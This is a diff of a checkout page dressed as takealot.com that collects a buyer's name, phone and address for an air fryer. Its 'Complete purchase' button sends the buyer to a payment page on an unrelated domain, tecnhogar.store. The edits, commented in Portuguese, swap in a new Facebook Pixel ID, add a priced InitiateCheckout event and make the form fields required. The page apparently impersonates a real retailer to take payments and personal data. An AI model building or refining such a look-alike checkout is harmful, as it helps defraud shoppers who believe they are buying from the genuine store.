@@ -1,4 +1,6 @@
-<!DOCTYPE html><html lang="en"><head>
+<!DOCTYPE html>
+<html lang="en">
+<head>
 <meta charset="utf-8">
 <meta name="viewport" content="width=device-width, initial-scale=1">
 <title>Checkout - Delivery Details</title>
@@ -14,9 +16,10 @@
   }(window, document,'script',
   'https://connect.facebook.net/en_US/fbevents.js');
 
-  fbq('init', '1238580704010895');
+  /* ID do Pixel atualizado para o teu */
+  fbq('init', '1961917827762675');
   fbq('track', 'PageView');
-  fbq('track', 'InitiateCheckout');
+  /* Removi o InitiateCheckout vazio daqui pois ele será disparado no botão com os valores corretos */
 </script>
 
 <script src="js/latest.js" data-utmify-prevent-xcod-sck="" data-utmify-prevent-subids="" async="" defer=""></script>
@@ -28,7 +31,8 @@
   a.setAttribute("defer", "");
   a.setAttribute("src", "https://cdn.utmify.com.br/scripts/pixel/pixel.js");
   document.head.appendChild(a);
-</script><script async="" defer="" src="js/pixel.js"></script>
+</script>
+<script async="" defer="" src="js/pixel.js"></script>
 
 <style>
 *{ box-sizing: border-box; margin: 0; padding: 0; }
@@ -303,7 +307,8 @@ body{
 
 <!-- TOP BAR -->
 <div class="topbar">
-  <img src="images/logo-takealot.svg" alt="takealot.com" class="logo-img">
+  <!-- Use a placeholder se a imagem real não carregar no editor de testes -->
+  <img src="images/logo-takealot.svg" onerror="this.src='https://placehold.co/150x40/ffffff/0b79d0?text=takealot'" alt="takealot.com" class="logo-img">
 </div>
 
 <!-- CONTENT -->
@@ -320,17 +325,17 @@ body{
     <form id="deliveryForm" autocomplete="on">
       <div class="field">
         <label class="field-label" for="recipientName">Recipient Name</label>
-        <input class="field-input" type="text" id="recipientName" name="name" autocomplete="name">
+        <input class="field-input" type="text" id="recipientName" name="name" autocomplete="name" required>
       </div>
 
       <div class="field">
         <label class="field-label" for="recipientMobile">Recipient Mobile Number</label>
-        <input class="field-input" type="tel" id="recipientMobile" name="phone" autocomplete="tel">
+        <input class="field-input" type="tel" id="recipientMobile" name="phone" autocomplete="tel" required>
       </div>
 
       <div class="field">
         <label class="field-label" for="streetAddress">Street Address</label>
-        <input class="field-input" type="text" id="streetAddress" name="street" autocomplete="street-address">
+        <input class="field-input" type="text" id="streetAddress" name="street" autocomplete="street-address" required>
       </div>
 
       <div class="field">
@@ -340,18 +345,18 @@ body{
 
       <div class="field">
         <label class="field-label" for="suburb">Suburb</label>
-        <input class="field-input" type="text" id="suburb" name="suburb">
+        <input class="field-input" type="text" id="suburb" name="suburb" required>
       </div>
 
       <div class="field">
         <label class="field-label" for="city">City / Town</label>
-        <input class="field-input" type="text" id="city" name="city" autocomplete="address-level2">
+        <input class="field-input" type="text" id="city" name="city" autocomplete="address-level2" required>
       </div>
 
       <div class="field">
         <label class="field-label" for="province">Province</label>
-        <select class="field-select" id="province" name="province">
-          <option value="" selected>Select</option>
+        <select class="field-select" id="province" name="province" required>
+          <option value="" selected disabled>Select</option>
           <option value="Eastern Cape">Eastern Cape</option>
           <option value="Free State">Free State</option>
           <option value="Gauteng">Gauteng</option>
@@ -366,7 +371,7 @@ body{
 
       <div class="field">
         <label class="field-label" for="postalCode">Postal Code</label>
-        <input class="field-input" type="text" id="postalCode" name="postalCode" autocomplete="postal-code" inputmode="numeric">
+        <input class="field-input" type="text" id="postalCode" name="postalCode" autocomplete="postal-code" inputmode="numeric" required>
       </div>
 
       <button class="save-btn" type="submit">Save</button>
@@ -397,7 +402,7 @@ body{
     <div class="items-label">ITEMS FOR DELIVERY</div>
 
     <div class="item-row">
-      <img class="item-img" src="images/p1.png" alt="6L Digital Roaster Air Fryer with Paper Liners">
+      <img class="item-img" src="images/p1.png" onerror="this.src='https://placehold.co/50x50/ffffff/333333?text=Fryer'" alt="6L Digital Roaster Air Fryer with Paper Liners">
       <div class="item-name">6L Digital Roaster Air Fryer with Paper Liners - Black + Free Silicone Liners</div>
     </div>
 
@@ -453,10 +458,15 @@ document.getElementById('deliveryForm').addEventListener('submit', function(e){
   window.scrollTo(0, 0);
 });
 
-// Complete the purchase button
+// Complete the purchase button (atualizado de acordo com a instrução)
 document.getElementById('completeBtn').addEventListener('click', function(){
-  window.location.href = 'https://www.tecnhogar.store/pay/faa8798d-3e10-4de3-bf64-b9e82fdc339f';
+  // Dispara o evento de InitiateCheckout do Pixel
+  fbq('track', 'InitiateCheckout', { value: 299.00, currency: 'ZAR' });
+  
+  // Redireciona com o parâmetro ic=0 para não duplicar o disparo na próxima página
+  window.location.href = 'https://www.tecnhogar.store/pay/faa8798d-3e10-4de3-bf64-b9e82fdc339f?ic=0';
 });
 </script>
 
-</body></html>
+</body>
+</html>
